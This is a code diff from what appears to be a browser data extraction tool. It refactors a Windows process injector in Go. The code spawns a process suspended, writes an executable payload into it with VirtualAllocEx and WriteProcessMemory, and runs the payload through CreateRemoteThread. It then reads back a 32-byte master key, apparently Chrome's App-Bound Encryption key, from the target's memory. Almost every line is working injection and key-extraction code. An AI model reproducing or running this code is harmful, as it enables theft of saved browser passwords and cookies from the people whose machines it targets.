@@ -8,9 +8,10 @@ import (
 	"os"
 	"syscall"
 	"time"
-	"unsafe"
 
 	"golang.org/x/sys/windows"
+
+	"github.com/moond4rk/hackbrowserdata/crypto/windows/abe_native/bootstrap"
 )
 
 type Reflective struct {
@@ -22,13 +23,6 @@ const (
 	// 30s covers GoogleChromeElevationService cold-start on first call after boot.
 	defaultWait   = 30 * time.Second
 	terminateWait = 2 * time.Second
-
-	// Keep in sync with bootstrap.h.
-	bootstrapMarkerOffset    = 0x28
-	bootstrapKeyStatusOffset = 0x29
-	bootstrapKeyOffset       = 0x40
-	bootstrapKeyLen          = 32
-	bootstrapKeyStatusReady  = 0x01
 )
 
 func (r *Reflective) Inject(exePath string, payload []byte, env map[string]string) ([]byte, error) {
@@ -83,18 +77,28 @@ func (r *Reflective) Inject(exePath string, payload []byte, env map[string]strin
 	}
 
 	// Read output before TerminateProcess — after kill the memory is gone.
-	status, key := readScratch(pi.Process, remoteBase)
+	result := readScratch(pi.Process, remoteBase)
 
 	_ = windows.TerminateProcess(pi.Process, 0)
 	_, _ = windows.WaitForSingleObject(pi.Process, uint32(terminateWait/time.Millisecond))
 	terminated = true
 
-	if status != bootstrapKeyStatusReady {
-		marker := readMarker(pi.Process, remoteBase)
-		return nil, fmt.Errorf("injector: payload did not publish key (status=0x%02x, marker=0x%02x)",
-			status, marker)
+	if result.Status != bootstrap.KeyStatusReady {
+		return nil, fmt.Errorf("injector: payload did not publish key (%s)", formatABEError(result))
 	}
-	return key, nil
+	return result.Key, nil
+}
+
+// scratchResult is the structured view of the 12-byte diagnostic header
+// (marker..com_err) plus the optional 32-byte master key the payload
+// publishes back into the remote process's scratch region.
+type scratchResult struct {
+	Marker  byte
+	Status  byte
+	ErrCode byte
+	HResult uint32
+	ComErr  uint32
+	Key     []byte
 }
 
 func (r *Reflective) wait() time.Duration {
@@ -138,29 +142,19 @@ func spawnSuspended(exePath string) (*windows.ProcessInformation, error) {
 }
 
 func writeRemotePayload(proc windows.Handle, payload []byte) (uintptr, error) {
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	procVirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-	procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
-
-	remoteBase, _, callErr := procVirtualAllocEx.Call(
+	remoteBase, err := callBoolErr(procVirtualAllocEx,
 		uintptr(proc), 0,
 		uintptr(len(payload)),
 		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
 		uintptr(windows.PAGE_EXECUTE_READWRITE),
 	)
-	if remoteBase == 0 {
-		return 0, fmt.Errorf("injector: VirtualAllocEx: %w", callErr)
+	if err != nil {
+		return 0, fmt.Errorf("injector: %w", err)
 	}
 
 	var written uintptr
-	r1, _, callErr := procWriteProcessMemory.Call(
-		uintptr(proc), remoteBase,
-		uintptr(unsafe.Pointer(&payload[0])),
-		uintptr(len(payload)),
-		uintptr(unsafe.Pointer(&written)),
-	)
-	if r1 == 0 {
-		return 0, fmt.Errorf("injector: WriteProcessMemory: %w", callErr)
+	if err := windows.WriteProcessMemory(proc, remoteBase, &payload[0], uintptr(len(payload)), &written); err != nil {
+		return 0, fmt.Errorf("injector: WriteProcessMemory: %w", err)
 	}
 	if int(written) != len(payload) {
 		return 0, fmt.Errorf("injector: short write to target (%d/%d)", written, len(payload))
@@ -169,16 +163,12 @@ func writeRemotePayload(proc windows.Handle, payload []byte) (uintptr, error) {
 }
 
 func runAndWait(proc windows.Handle, remoteBase uintptr, loaderRVA uint32, wait time.Duration) error {
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	procCreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
-
 	entry := remoteBase + uintptr(loaderRVA)
-	hThread, _, callErr := procCreateRemoteThread.Call(
-		uintptr(proc),
-		0, 0, entry, 0, 0, 0,
+	hThread, err := callBoolErr(procCreateRemoteThread,
+		uintptr(proc), 0, 0, entry, 0, 0, 0,
 	)
-	if hThread == 0 {
-		return fmt.Errorf("injector: CreateRemoteThread: %w", callErr)
+	if err != nil {
+		return fmt.Errorf("injector: %w", err)
 	}
 	defer windows.CloseHandle(windows.Handle(hThread))
 
@@ -186,57 +176,39 @@ func runAndWait(proc windows.Handle, remoteBase uintptr, loaderRVA uint32, wait 
 	return nil
 }
 
-func readScratch(proc windows.Handle, remoteBase uintptr) (status byte, key []byte) {
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	procReadProcessMemory := kernel32.NewProc("ReadProcessMemory")
-
-	var sb [1]byte
+// readScratch pulls the payload's diagnostic header and (on success) the
+// master key out of the target process's scratch region via a single
+// 12-byte ReadProcessMemory covering marker..com_err, plus an optional
+// second read for the 32-byte key when Status == ready.
+func readScratch(proc windows.Handle, remoteBase uintptr) scratchResult {
+	// hdr covers offsets 0x28..0x33: marker, status, extract_err_code,
+	// _reserved, hresult (LE u32), com_err (LE u32).
+	var hdr [12]byte
 	var n uintptr
-	r, _, _ := procReadProcessMemory.Call(
-		uintptr(proc),
-		remoteBase+uintptr(bootstrapKeyStatusOffset),
-		uintptr(unsafe.Pointer(&sb[0])),
-		1,
-		uintptr(unsafe.Pointer(&n)),
-	)
-	if r == 0 {
-		return 0, nil
+	if err := windows.ReadProcessMemory(proc,
+		remoteBase+uintptr(bootstrap.MarkerOffset),
+		&hdr[0], uintptr(len(hdr)), &n); err != nil || int(n) != len(hdr) {
+		return scratchResult{}
 	}
-	status = sb[0]
-	if status != bootstrapKeyStatusReady {
-		return status, nil
+	result := scratchResult{
+		Marker:  hdr[0],
+		Status:  hdr[1],
+		ErrCode: hdr[2],
+		HResult: binary.LittleEndian.Uint32(hdr[4:8]),
+		ComErr:  binary.LittleEndian.Uint32(hdr[8:12]),
+	}
+	if result.Status != bootstrap.KeyStatusReady {
+		return result
 	}
 
-	buf := make([]byte, bootstrapKeyLen)
-	r, _, _ = procReadProcessMemory.Call(
-		uintptr(proc),
-		remoteBase+uintptr(bootstrapKeyOffset),
-		uintptr(unsafe.Pointer(&buf[0])),
-		uintptr(bootstrapKeyLen),
-		uintptr(unsafe.Pointer(&n)),
-	)
-	if r == 0 || int(n) != bootstrapKeyLen {
-		return status, nil
+	buf := make([]byte, bootstrap.KeyLen)
+	if err := windows.ReadProcessMemory(proc,
+		remoteBase+uintptr(bootstrap.KeyOffset),
+		&buf[0], uintptr(bootstrap.KeyLen), &n); err != nil || int(n) != bootstrap.KeyLen {
+		return result
 	}
-	return status, buf
-}
-
-func readMarker(proc windows.Handle, remoteBase uintptr) byte {
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	procReadProcessMemory := kernel32.NewProc("ReadProcessMemory")
-	var b [1]byte
-	var n uintptr
-	r, _, _ := procReadProcessMemory.Call(
-		uintptr(proc),
-		remoteBase+uintptr(bootstrapMarkerOffset),
-		uintptr(unsafe.Pointer(&b[0])),
-		1,
-		uintptr(unsafe.Pointer(&n)),
-	)
-	if r == 0 {
-		return 0
-	}
-	return b[0]
+	result.Key = buf
+	return result
 }
 
 // patchPreresolvedImports writes five pre-resolved Win32 function pointers
@@ -244,18 +216,15 @@ func readMarker(proc windows.Handle, remoteBase uintptr) byte {
 // Validity relies on KnownDlls + session-consistent ASLR (kernel32 and ntdll
 // share the same virtual address across processes in one boot session).
 func patchPreresolvedImports(payload []byte) ([]byte, error) {
-	if len(payload) < 0x68 {
+	if len(payload) < bootstrap.ImpNtFlushICOffset+8 {
 		return nil, fmt.Errorf("injector: payload too small for pre-resolved import patch")
 	}
 
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
-
-	pLoadLibraryA := kernel32.NewProc("LoadLibraryA").Addr()
-	pGetProcAddress := kernel32.NewProc("GetProcAddress").Addr()
-	pVirtualAlloc := kernel32.NewProc("VirtualAlloc").Addr()
-	pVirtualProtect := kernel32.NewProc("VirtualProtect").Addr()
-	pNtFlushIC := ntdll.NewProc("NtFlushInstructionCache").Addr()
+	pLoadLibraryA := procLoadLibraryA.Addr()
+	pGetProcAddress := procGetProcAddress.Addr()
+	pVirtualAlloc := procVirtualAlloc.Addr()
+	pVirtualProtect := procVirtualProtect.Addr()
+	pNtFlushIC := procNtFlushIC.Addr()
 
 	if pLoadLibraryA == 0 || pGetProcAddress == 0 || pVirtualAlloc == 0 ||
 		pVirtualProtect == 0 || pNtFlushIC == 0 {
@@ -268,11 +237,11 @@ func patchPreresolvedImports(payload []byte) ([]byte, error) {
 	writeAddr := func(off int, addr uintptr) {
 		binary.LittleEndian.PutUint64(patched[off:off+8], uint64(addr))
 	}
-	writeAddr(0x40, pLoadLibraryA)
-	writeAddr(0x48, pGetProcAddress)
-	writeAddr(0x50, pVirtualAlloc)
-	writeAddr(0x58, pVirtualProtect)
-	writeAddr(0x60, pNtFlushIC)
+	writeAddr(bootstrap.ImpLoadLibraryAOffset, pLoadLibraryA)
+	writeAddr(bootstrap.ImpGetProcAddressOffset, pGetProcAddress)
+	writeAddr(bootstrap.ImpVirtualAllocOffset, pVirtualAlloc)
+	writeAddr(bootstrap.ImpVirtualProtectOffset, pVirtualProtect)
+	writeAddr(bootstrap.ImpNtFlushICOffset, pNtFlushIC)
 
 	return patched, nil
 }
